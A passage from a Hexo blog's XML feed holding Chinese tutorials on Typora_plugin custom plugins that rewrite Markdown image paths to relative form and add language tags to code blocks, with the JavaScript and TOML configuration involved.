        <tag>Netlify</tag>
        <tag>Cloudflare</tag>
        <tag>Github-pages</tag>
        <tag>Render</tag>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Typora_plugin实现Hexo博客绝对路径一键替换相对路径|正斜杠替换为反斜杠</title>
    <url>/posts/520cc65.html</url>
    <content><![CDATA[<h1 id="使用-Typora-plugin-实现-Hexo-博客绝对路径一键替换相对路径-正斜杠替换为反斜杠"><a href="#使用-Typora-plugin-实现-Hexo-博客绝对路径一键替换相对路径-正斜杠替换为反斜杠" class="headerlink" title="使用 Typora_plugin 实现 Hexo 博客绝对路径一键替换相对路径|正斜杠替换为反斜杠"></a>使用 Typora_plugin 实现 Hexo 博客绝对路径一键替换相对路径|正斜杠替换为反斜杠</h1><p>今天下午偶然的发现，解决了我很久以来一直想解决的问题，因为在 Hexo 博客上传的时候我一般是把图片插入进去，但是默认的路径是绝对路径，曾经在 Typora 设置里改过，但是效果也不好，今天想起了 Typora plugin，于是想基于 Typora plugin 开发一个插件</p>
<p>首先感谢 Typora plugin 开发者 <a class="link"   href="https://github.com/obgnail/typora_plugin/" >https://github.com/obgnail/typora_plugin/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>真心感谢插件开发大佬😭😭😭😭😭😭😭😭😭😭😭</p>
<p>我把问题抛给大佬，大佬轮子都给我造好了，而且还有礼貌，我说我写个安装文档提供给其他有需要的用户使用，他甚至还麻烦我</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Typora_plugin/ReplaceBackslash/image-20240208160233056.png"
                      alt="image-20240208160233056"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Typora_plugin/ReplaceBackslash/image-20240208160340371.png"
                      alt="image-20240208160340371"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Typora_plugin/ReplaceBackslash/image-20240208160411419.png"
                      alt="image-20240208160411419"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Typora_plugin/ReplaceBackslash/image-20240208164539253.png"
                      alt="image-20240208164539253"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Typora_plugin/ReplaceBackslash/image-20240208172549961.png"
                      alt="image-20240208172549961"
                ></p>
<h2 id="脚本适用情况"><a href="#脚本适用情况" class="headerlink" title="脚本适用情况"></a>脚本适用情况</h2><p>该脚本主要实现功能是，Markdown 中所有的图片路径中正斜杠一键替换为反斜杠，并把包含..&#x2F;images&#x2F;的路径替换为相对路径，方便 Hexo 博客上传</p>
<p>例如 Markdown 中文件路径是 <code>[示例图片](F:/Hexo/source../images/test.png)</code></p>
<p>替换后的路径就是 <code>[示例图片](../images/test.png)</code></p>
<p>本脚本适用于：Hexo 博客写作排版，Hexo 图片放在&#x2F;source&#x2F;文件下的 Hexo 博客作者</p>
<h2 id="安装-Typora-plugin"><a href="#安装-Typora-plugin" class="headerlink" title="安装 Typora plugin"></a>安装 Typora plugin</h2><p>有关插件的安装教程可以看官方的仓库，Readme 写的很详细了</p>
<p><a class="link"   href="https://github.com/obgnail/typora_plugin/" >https://github.com/obgnail/typora_plugin/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="创建-JS"><a href="#创建-JS" class="headerlink" title="创建 JS"></a>创建 JS</h2><p>在 <code>./plugin/custom/plugins/ReplaceBackslash.js</code> 文件中创建 js 文件，把下面代码复制进去。</p>
<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ReplaceBackslash</span> <span class="keyword">extends</span> <span class="title class_ inherited__">BaseCustomPlugin</span> &#123;</span><br><span class="line">    hotkey = <span class="function">() =&gt;</span> [<span class="variable language_">this</span>.<span class="property">config</span>.<span class="property">hotkey</span>]</span><br><span class="line">    callback = <span class="keyword">async</span> anchorNode =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> filepath = <span class="variable language_">this</span>.<span class="property">utils</span>.<span class="title function_">getFilePath</span>();</span><br><span class="line">        <span class="keyword">const</span> content = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">utils</span>.<span class="property">Package</span>.<span class="property">Fs</span>.<span class="property">promises</span>.<span class="title function_">readFile</span>(filepath, <span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> replacedContent = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">format</span>(content);</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">utils</span>.<span class="property">Package</span>.<span class="property">Fs</span>.<span class="property">promises</span>.<span class="title function_">writeFile</span>(filepath, replacedContent);</span><br><span class="line">        <span class="title class_">File</span>.<span class="title function_">reloadContent</span>(replacedContent, &#123; <span class="attr">fromDiskChange</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    format = <span class="keyword">async</span> content =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> dir = <span class="variable language_">this</span>.<span class="property">utils</span>.<span class="title function_">getCurrentDirPath</span>();</span><br><span class="line">        <span class="keyword">const</span> imgFolder = <span class="variable language_">this</span>.<span class="property">config</span>.<span class="property">img_folder</span>;</span><br><span class="line">        <span class="keyword">const</span> regexp = <span class="variable language_">this</span>.<span class="property">config</span>.<span class="property">ignore_image_div</span></span><br><span class="line">            ? <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&quot;!\\[.*?\\]\\((?&lt;src1&gt;.*)\\)&quot;</span>, <span class="string">&quot;g&quot;</span>)</span><br><span class="line">            : <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&quot;!\\[.*?\\]\\((?&lt;src1&gt;.*)\\)|&lt;img.*?src=\&quot;(?&lt;src2&gt;.*?)\&quot;&quot;</span>, <span class="string">&quot;g&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">asyncReplace</span>(content, regexp, <span class="title function_">async</span> (match, src1, src2) =&gt; &#123;</span><br><span class="line">            <span class="keyword">const</span> src = src1 || src2;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 跳过特殊格式的图片（如base64）和网络图片</span></span><br><span class="line">            <span class="keyword">if</span> (!src || <span class="variable language_">this</span>.<span class="property">utils</span>.<span class="title function_">isSpecialImage</span>(src) || <span class="variable language_">this</span>.<span class="property">utils</span>.<span class="title function_">isNetworkImage</span>(src)) <span class="keyword">return</span> match;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 检测图片是否存在于当前电脑中，若不存在，则不处理</span></span><br><span class="line">            <span class="comment">// 如果不希望检测，可以注释掉下面两行</span></span><br><span class="line">            <span class="keyword">const</span> realPath = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">checkImageExist</span>(dir, src);</span><br><span class="line">            <span class="keyword">if</span> (!realPath) &#123;</span><br><span class="line">                <span class="comment">// 如果路径中没有反斜杠，则检查是否位于指定的 img 文件夹中</span></span><br><span class="line">                <span class="keyword">if</span> (!src.<span class="title function_">includes</span>(<span class="string">&#x27;\\&#x27;</span>) &amp;&amp; !src.<span class="title function_">includes</span>(<span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">const</span> imgPath = <span class="variable language_">this</span>.<span class="property">utils</span>.<span class="property">Package</span>.<span class="property">Path</span>.<span class="title function_">resolve</span>(dir, imgFolder, src);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">utils</span>.<span class="title function_">existPath</span>(imgPath)) &#123;</span><br><span class="line">                        <span class="comment">// 如果图片存在于指定的 img 文件夹中，则返回处理后的路径</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">replaceBackslash</span>(match, src, imgPath);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 如果路径中无反斜杠并且不在指定的 img 文件夹中，则保持原样</span></span><br><span class="line">                <span class="keyword">return</span> match;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 进行路径替换并处理反斜杠</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">replaceBackslash</span>(match, src, realPath);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 替换路径逻辑</span></span><br><span class="line">    replaceBackslash = <span class="function">(<span class="params">match, src, realPath</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 将路径中的反斜杠 \ 替换为斜杠 /</span></span><br><span class="line">        <span class="keyword">const</span> replacedSrc = realPath.<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> index = match.<span class="title function_">indexOf</span>(src);</span><br><span class="line">        <span class="keyword">return</span> match.<span class="title function_">slice</span>(<span class="number">0</span>, index) + match.<span class="title function_">slice</span>(index).<span class="title function_">replace</span>(src, replacedSrc);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    asyncReplace = <span class="function">(<span class="params">content, regexp, placement</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> match;</span><br><span class="line">        <span class="keyword">let</span> lastIndex = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">const</span> promises = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((match = regexp.<span class="title function_">exec</span>(content))) &#123;</span><br><span class="line">            <span class="keyword">const</span> str = content.<span class="title function_">slice</span>(lastIndex, match.<span class="property">index</span>);</span><br><span class="line">            lastIndex = regexp.<span class="property">lastIndex</span>;</span><br><span class="line">            <span class="keyword">const</span> args = [match[<span class="number">0</span>], match.<span class="property">groups</span>?.<span class="property">src1</span>, match.<span class="property">groups</span>?.<span class="property">src2</span>, match.<span class="property">index</span>, match.<span class="property">input</span>];</span><br><span class="line">            <span class="keyword">const</span> promise = <span class="title function_">placement</span>(...args);</span><br><span class="line">            promises.<span class="title function_">push</span>(str, promise);</span><br><span class="line">        &#125;</span><br><span class="line">        promises.<span class="title function_">push</span>(content.<span class="title function_">slice</span>(lastIndex));</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>(promises).<span class="title function_">then</span>(<span class="function"><span class="params">results</span> =&gt;</span> results.<span class="title function_">join</span>(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    checkImageExist = <span class="title function_">async</span> (currentDir, path) =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> absolutePath = <span class="variable language_">this</span>.<span class="property">utils</span>.<span class="property">Package</span>.<span class="property">Path</span>.<span class="title function_">resolve</span>(currentDir, path);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!(<span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">utils</span>.<span class="title function_">existPath</span>(absolutePath))) &#123;</span><br><span class="line">            <span class="keyword">const</span> idx = absolutePath.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;)&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (idx === -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                absolutePath = absolutePath.<span class="title function_">slice</span>(<span class="number">0</span>, idx);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> absolutePath;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123; <span class="attr">plugin</span>: <span class="title class_">ReplaceBackslash</span> &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="启用插件"><a href="#启用插件" class="headerlink" title="启用插件"></a>启用插件</h2><ol>
<li>修改 <code>./plugin/global/settings/custom_plugin.user.toml</code>，添加配置：</li>
</ol>
<div class="code-container" data-rel="Toml"><figure class="iseeu highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[ReplaceBackslash]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;替换反斜杠为正斜杠&quot;</span></span><br><span class="line"><span class="attr">enable</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="section">[ReplaceBackslash.config]</span></span><br><span class="line"><span class="comment"># 是否忽略html标签&lt;img src=&quot;example.jpg&quot;&gt;里的资源（markdown是支持插入html的，此选项问是否要忽略img标签）</span></span><br><span class="line"><span class="attr">ignore_image_div</span> = <span class="literal">false</span></span><br><span class="line"><span class="attr">img_folder</span> = <span class="string">&quot;img&quot;</span>          <span class="comment">#这里引号内的内容改为你自己的文件夹命名</span></span><br></pre></td></tr></table></figure></div>

<p>这里引号内的内容改为你自己的文件夹命名</p>
<h2 id="添加快捷方式"><a href="#添加快捷方式" class="headerlink" title="添加快捷方式"></a>添加快捷方式</h2><h3 id="添加快捷键"><a href="#添加快捷键" class="headerlink" title="添加快捷键"></a>添加快捷键</h3><p>修改 <code>./plugin/global/settings/custom_plugin.user.toml</code>，添加配置</p>
<p>在上一步的基础上，继续添加一行代码</p>
<div class="code-container" data-rel="Toml"><figure class="iseeu highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[ReplaceBackslash.config]</span></span><br><span class="line"><span class="comment"># 是否忽略html标签&lt;img src=&quot;example.jpg&quot;&gt;里的资源（markdown是支持插入html的，此选项问是否要忽略img标签）</span></span><br><span class="line"><span class="attr">ignore_image_div</span> = <span class="literal">false</span></span><br><span class="line"><span class="attr">img_folder</span> = <span class="string">&quot;img&quot;</span></span><br><span class="line"><span class="comment"># 快捷键（若为&quot;&quot;，则不注册）</span></span><br><span class="line"><span class="attr">hotkey</span> = <span class="string">&quot;ctrl+shift+m&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>这里快捷键设置为 <code>ctrl+shift+m</code> 可以根据自己需要修改</p>
<h3 id="添加快捷按钮"><a href="#添加快捷按钮" class="headerlink" title="添加快捷按钮"></a>添加快捷按钮</h3><p>在上一步的基础上，继续添加代码</p>
<div class="code-container" data-rel="Toml"><figure class="iseeu highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[quickButton]</span></span><br><span class="line"><span class="section">[quickButton.config]</span></span><br><span class="line"><span class="comment">#   disable:      禁用此按钮</span></span><br><span class="line"><span class="comment">#   coordinate:   按钮坐标。往上为x轴正方向，往左为y轴正方向，从零开始计数</span></span><br><span class="line"><span class="comment">#   icon:         按钮图标。填入css class。支持font-awesome-4.1.0和ionicons-2.0.1，所有的图标及其对应的css class请参考：https://www.adfwebmagazine.jp/wp-content/uploads/test_v4.1.pdf  和  https://ionic.io/ionicons/v2</span></span><br><span class="line"><span class="comment">#   size(可选):    图标大小。默认17px</span></span><br><span class="line"><span class="comment">#   color(可选):   图标颜色。默认跟随当前主题的配色方案</span></span><br><span class="line"><span class="comment">#   bgColor(可选): 图标背景色。默认跟随当前主题的配色方案</span></span><br><span class="line"><span class="comment">#   hint:         提示信息</span></span><br><span class="line"><span class="comment">#   callback:     回调函数。采用pluginName.MethodName的形式（功能就像hotkey.default.toml中的plugin参数和function参数的合体）</span></span><br><span class="line"><span class="comment">#                     MethodName请通过阅读源码查找。如果您不懂代码，但还是想添加按钮，有个碰运气技巧：在【右键菜单-&gt;常用插件-&gt;自定义插件下的插件】基本都是XXX.callback，其余插件基本都是XXX.call</span></span><br><span class="line"><span class="comment">#   evil(危险):    自定义回调函数。功能同hotkey.default.toml中的evil参数（它能用的，这里也能用）。这里的文本内容会被eval()。如果设置此参数，callback参数会失效</span></span><br><span class="line"><span class="attr">buttons</span> = [</span><br><span class="line">    <span class="comment"># 默认的按钮</span></span><br><span class="line">    &#123; disable = <span class="literal">false</span>, coordinate = [<span class="number">0</span>, <span class="number">0</span>], hint = <span class="string">&quot;直达底部&quot;</span>, size = <span class="string">&quot;28px&quot;</span>, icon = <span class="string">&quot;fa fa-angle-down&quot;</span>, callback = <span class="string">&quot;go_top.goBottom&quot;</span> &#125;,</span><br><span class="line">    &#123; disable = <span class="literal">false</span>, coordinate = [<span class="number">1</span>, <span class="number">0</span>], hint = <span class="string">&quot;直达顶部&quot;</span>, size = <span class="string">&quot;28px&quot;</span>, icon = <span class="string">&quot;fa fa-angle-up&quot;</span>, callback = <span class="string">&quot;go_top.goTop&quot;</span> &#125;,</span><br><span class="line">    &#123; disable = <span class="literal">false</span>, coordinate = [<span class="number">2</span>, <span class="number">0</span>], hint = <span class="string">&quot;文字风格&quot;</span>, size = <span class="string">&quot;17px&quot;</span>, icon = <span class="string">&quot;fa fa-font&quot;</span>, callback = <span class="string">&quot;text_stylize.call&quot;</span> &#125;,</span><br><span class="line">    &#123; disable = <span class="literal">false</span>, coordinate = [<span class="number">3</span>, <span class="number">0</span>], hint = <span class="string">&quot;混排优化&quot;</span>, size = <span class="string">&quot;17px&quot;</span>, icon = <span class="string">&quot;fa fa-align-justify&quot;</span>, callback = <span class="string">&quot;md_padding.call&quot;</span> &#125;,</span><br><span class="line">    &#123; disable = <span class="literal">false</span>, coordinate = [<span class="number">0</span>, <span class="number">1</span>], hint = <span class="string">&quot;思维导图&quot;</span>, size = <span class="string">&quot;22px&quot;</span>, icon = <span class="string">&quot;fa fa-code-fork&quot;</span>, callback = <span class="string">&quot;markmap.onButtonClick&quot;</span> &#125;,</span><br><span class="line">    &#123; disable = <span class="literal">false</span>, coordinate = [<span class="number">1</span>, <span class="number">1</span>], hint = <span class="string">&quot;图片管理&quot;</span>, size = <span class="string">&quot;17px&quot;</span>, icon = <span class="string">&quot;fa fa-image&quot;</span>, callback = <span class="string">&quot;imageReviewer.callback&quot;</span> &#125;,</span><br><span class="line">    &#123; disable = <span class="literal">false</span>, coordinate = [<span class="number">2</span>, <span class="number">1</span>], hint = <span class="string">&quot;书签管理&quot;</span>, size = <span class="string">&quot;17px&quot;</span>, icon = <span class="string">&quot;fa fa-bookmark&quot;</span>, callback = <span class="string">&quot;scrollBookmarker.callback&quot;</span> &#125;,</span><br><span class="line">    &#123; disable = <span class="literal">false</span>, coordinate = [<span class="number">3</span>, <span class="number">1</span>], hint = <span class="string">&quot;高亮搜索&quot;</span>, size = <span class="string">&quot;17px&quot;</span>, icon = <span class="string">&quot;fa fa-search&quot;</span>, callback = <span class="string">&quot;search_multi.call&quot;</span> &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 你的按钮</span></span><br><span class="line">    &#123; disable = <span class="literal">false</span>, coordinate = [<span class="number">4</span>, <span class="number">1</span>], hint = <span class="string">&quot;正斜杠替换斜杠&quot;</span>, size = <span class="string">&quot;17px&quot;</span>, icon = <span class="string">&quot;fa fa-book&quot;</span>, callback = <span class="string">&quot;ReplaceBackslash.callback&quot;</span> &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div>

<p>重启 Typora 就可以在右下角看到添加的快捷按钮</p>
<h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Typora_plugin/ReplaceBackslash/end.gif"
                      alt="end"
                ></p>
<h2 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h2><p>2024 年 2 月 8 日 ， 修了一处没有考虑到的 bug，原先只能转换绝对路径，对于（….&#x2F;images&#x2F;）形式的路径不会处理，修复后也包括了这种情况，具体改动可以查看编辑历史</p>
<p>2024 年 2 月 8 日 ，重写了代码逻辑，改为先进行反斜杠替换，然后进行路径重写为相对路径</p>
<p>2024 年 2 月 8 日 ，增加了一个实现效果 GIF 演示</p>
<p>2024 年 2 月 8 日 ，受作者启发，将代码中硬编码的 ..&#x2F;images&#x2F; 改成一个配置选项，脚本使用者可以根据自己需要修改配置变量的内容</p>
<p>2024 年 2 月 9 日 ，代码已更新，经过作者的施教，增强了图片路径的匹配，解决了原先替换全文\的问题，现在只替换图片路径，插件作者太强了</p>
<p>如图</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Typora_plugin/ReplaceBackslash/39744b9eade1b1f68271869e78e3a50e.png"
                      alt="39744b9eade1b1f68271869e78e3a50e"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Typora_plugin/ReplaceBackslash/0096befcd128b3bf9346b755fe9e2ccf.png"
                      alt="0096befcd128b3bf9346b755fe9e2ccf"
                ></p>
<p>2024 年 2 月 10 日，大佬帮忙抓虫，纠正了快捷键的配置</p>
<p>2024 年 2 月 18 日，大佬指出错误，修改了快捷键的错误</p>
<h2 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h2><p>感谢 Typora_plugin 作者，极大地方便了我的写作</p>
<p>感谢 ChatGPT，给了我代码写作的开头</p>
<ol>
<li><a class="link"   href="https://github.com/obgnail/typora_plugin/issues/467" >https://github.com/obgnail/typora_plugin/issues/467<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://w1ndys.top/" >https://w1ndys.top/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://chat.openai.com/" >https://chat.openai.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ol>
<hr>
<p>文章来自 <a href="https://blog.w1ndys.top/posts/520cc65">https://blog.w1ndys.top/posts/520cc65</a></p>
]]></content>
      <categories>
        <category>技术教程</category>
        <category>Typora</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Typora</tag>
        <tag>Typora-plugin</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Typora_plugin实现Markdown代码块一键填充指定编程语言</title>
    <url>/posts/979ed90f.html</url>
    <content><![CDATA[<h1 id="使用-Typora-plugin-实现-Markdownd-代码块一键填充指定编程语言"><a href="#使用-Typora-plugin-实现-Markdownd-代码块一键填充指定编程语言" class="headerlink" title="使用 Typora_plugin 实现 Markdownd 代码块一键填充指定编程语言"></a>使用 Typora_plugin 实现 Markdownd 代码块一键填充指定编程语言</h1><h2 id="轮子"><a href="#轮子" class="headerlink" title="轮子"></a>轮子</h2><p>首先感谢大佬写好的轮子</p>
<p>使用的时候请把里面的 <code>plugin_name</code> 改为插件的实际文件名</p>
<div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">plugin_name</span> <span class="keyword">extends</span> <span class="title class_ inherited__">BaseCustomPlugin</span> &#123;</span><br><span class="line">    callback = <span class="keyword">async</span> anchorNode =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> filepath = <span class="variable language_">this</span>.<span class="property">utils</span>.<span class="title function_">getFilePath</span>();</span><br><span class="line">        <span class="keyword">const</span> content = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">utils</span>.<span class="property">Package</span>.<span class="property">Fs</span>.<span class="property">promises</span>.<span class="title function_">readFile</span>(filepath, <span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> replacedContent = <span class="variable language_">this</span>.<span class="title function_">plugin_name</span>(content);</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">utils</span>.<span class="property">Package</span>.<span class="property">Fs</span>.<span class="property">promises</span>.<span class="title function_">writeFile</span>(filepath, replacedContent);</span><br><span class="line">        <span class="title class_">File</span>.<span class="title function_">reloadContent</span>(replacedContent, &#123;<span class="attr">fromDiskChange</span>: <span class="literal">false</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在这里写主要的逻辑代码</span></span><br><span class="line">    plugin_name = <span class="function"><span class="params">content</span> =&gt;</span> &#123;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123; <span class="attr">plugin</span>: plugin_name &#125;;</span><br></pre></td></tr></table></figure></div>

<h2 id="安装-Typora-plugin"><a href="#安装-Typora-plugin" class="headerlink" title="安装 Typora plugin"></a>安装 Typora plugin</h2><p>有关插件的安装教程可以看官方的仓库，Readme 写的很详细了</p>
<p><a class="link"   href="https://github.com/obgnail/typora_plugin/" >https://github.com/obgnail/typora_plugin/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="创建-JS"><a href="#创建-JS" class="headerlink" title="创建 JS"></a>创建 JS</h2><p>在 <code>./plugin/custom/plugins/</code> 文件中创建 <code>MarkdownToCode.js</code> 文件，把下面代码复制进去。</p>
<div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ./plugin/custom/plugins/markdownToCode.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MarkdownToCode</span> <span class="keyword">extends</span> <span class="title class_ inherited__">BaseCustomPlugin</span> &#123;</span><br><span class="line">    callback = <span class="keyword">async</span> anchorNode =&gt; <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">utils</span>.<span class="title function_">editCurrentFile</span>(<span class="variable language_">this</span>.<span class="property">convertMarkdownToCode</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 主要逻辑代码</span></span><br><span class="line">    convertMarkdownToCode = <span class="function"><span class="params">content</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> components = [&#123; <span class="attr">label</span>: <span class="string">&quot;语言&quot;</span>, <span class="attr">type</span>: <span class="string">&quot;input&quot;</span>, <span class="attr">value</span>: <span class="variable language_">this</span>.<span class="property">config</span>.<span class="property">code</span>.<span class="title function_">toLowerCase</span>() &#125;];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">utils</span>.<span class="title function_">modal</span>(&#123; <span class="attr">title</span>: <span class="string">&quot;添加语言&quot;</span>, components &#125;, <span class="title function_">async</span> ([&#123; <span class="attr">submit</span>: targetLang &#125;]) =&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (!targetLang) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">const</span> updatedContent = <span class="variable language_">this</span>.<span class="title function_">updateCodeLanguage</span>(content, targetLang.<span class="title function_">toLowerCase</span>());</span><br><span class="line">            <span class="keyword">const</span> filepath = <span class="variable language_">this</span>.<span class="property">utils</span>.<span class="title function_">getFilePath</span>();</span><br><span class="line">            <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">utils</span>.<span class="property">Package</span>.<span class="property">Fs</span>.<span class="property">promises</span>.<span class="title function_">writeFile</span>(filepath, updatedContent);</span><br><span class="line">            <span class="title class_">File</span>.<span class="title function_">reloadContent</span>(updatedContent, &#123; <span class="attr">fromDiskChange</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新代码块语言</span></span><br><span class="line">    updateCodeLanguage = <span class="function">(<span class="params">content, targetLang</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> codeBlockRegex = <span class="regexp">/```(?:\w+)?\s*([\s\S]+?)\s*```/g</span>; <span class="comment">// 匹配代码块，包括语言指定部分</span></span><br><span class="line">        <span class="keyword">const</span> updatedContent = content.<span class="title function_">replace</span>(codeBlockRegex, <span class="function">(<span class="params">match, codeContent</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// 匹配到的完整代码块</span></span><br><span class="line">            <span class="keyword">const</span> codeLanguageMatch = match.<span class="title function_">match</span>(<span class="regexp">/```(\w+)?/</span>); <span class="comment">// 匹配代码块语言指定部分</span></span><br><span class="line">            <span class="keyword">const</span> codeLanguage = codeLanguageMatch ? codeLanguageMatch[<span class="number">1</span>] : <span class="literal">null</span>; <span class="comment">// 获取代码块语言</span></span><br><span class="line">            <span class="comment">// 如果语言未指定或者不是目标语言，则添加目标语言标记</span></span><br><span class="line">            <span class="keyword">if</span> (!codeLanguage || codeLanguage.<span class="title function_">toLowerCase</span>() !== targetLang) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;```&#x27;</span> + targetLang + <span class="string">&#x27;\n&#x27;</span> + codeContent + <span class="string">&#x27;\n```&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> match; <span class="comment">// 代码块已经指定为目标语言，不需要修改</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> updatedContent;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123; <span class="attr">plugin</span>: <span class="title class_">MarkdownToCode</span> &#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="启用插件"><a href="#启用插件" class="headerlink" title="启用插件"></a>启用插件</h2><ol>
<li>修改 <code>./plugin/global/settings/custom_plugin.user.toml</code>，添加配置：</li>
</ol>
